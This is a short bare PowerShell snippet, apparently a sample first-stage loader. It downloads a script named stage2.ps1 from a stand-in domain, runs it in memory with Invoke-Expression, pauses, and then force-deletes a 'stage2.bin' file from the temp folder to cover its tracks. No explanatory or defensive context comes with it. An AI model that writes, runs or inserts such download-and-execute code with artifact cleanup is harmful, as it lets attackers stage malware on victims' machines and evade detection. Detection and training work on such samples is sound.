
$PayloadText = (New-Object System.Net.WebClient).DownloadString('https://adatum.com/stage2.ps1')
IEX $PayloadText
Start-Sleep -Seconds 17
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
